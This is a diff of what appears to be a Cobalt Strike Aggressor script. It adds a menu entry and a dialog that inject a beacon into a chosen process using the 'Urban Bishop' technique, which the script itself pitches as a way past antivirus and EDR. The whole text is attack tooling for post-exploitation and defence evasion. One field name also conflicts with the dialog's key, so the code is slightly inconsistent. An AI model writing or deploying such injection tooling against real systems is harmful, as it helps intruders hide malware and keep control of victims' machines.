@@ -51,24 +51,19 @@ item "RemoteProcessInjection - Mr-Un1k0d3r - x64"{
         foreach $bid ($1){
             rpi64($bid);
       }
+      
+  }
+  
+  item "Inject Urban Bishop by Sk3w"{
 
-
-sub monitor_tickets{
-    $bid = $1;
-    $dialog = dialog("Urban Bishop Process Injection", %(processid => "", listener => "", execmethod => "fireAlias"), lambda({
-        $cmdargs = "";
-		$cmdargs = "$3['processid'] $3['listener']";
-        if ($3["execmethod"] eq "fireAlias"){
-            btask($bid, 'Injecting Urban Bishop');
-            bfireAlias($bid, inject-ub, $cmdargs);
-        }
-    }));
-    dialog_description($dialog, "This is a process injection technique that may help with aggressive AV and EDR");
-    drow_text($dialog, "processid",  "Process ID to inject into");
-    drow_text($dialog, "filteruser",  "Listener Name");
-    dbutton_action($dialog, "Run");
-	dialog_show($dialog);
+    local('$bid');
+        foreach $bid ($1){
+            urbanbishopinjection($bid);
+      }
 }
+
+
+
 
     } #End Menu
 
@@ -182,3 +177,21 @@ beacon_command_register(
     "inject-ub",
     "inject beacon using urbanbishop technique",
     "Usage: inject-ub [pid] [listener]");
+    
+    
+    sub urbanbishopinjection{
+    $bid = $1;
+    $dialog = dialog("Urban Bishop Process Injection", %(processid => "", listener => "", execmethod => "fireAlias"), lambda({
+        $cmdargs = "";
+		$cmdargs = "$3['processid'] $3['listener']";
+        if ($3["execmethod"] eq "fireAlias"){
+            btask($bid, 'Injecting Urban Bishop');
+            bfireAlias($bid, inject-ub, $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "This is a process injection technique that may help with aggressive AV and EDR");
+    drow_text($dialog, "processid",  "Process ID to inject into");
+    drow_text($dialog, "filteruser",  "Listener Name");
+    dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
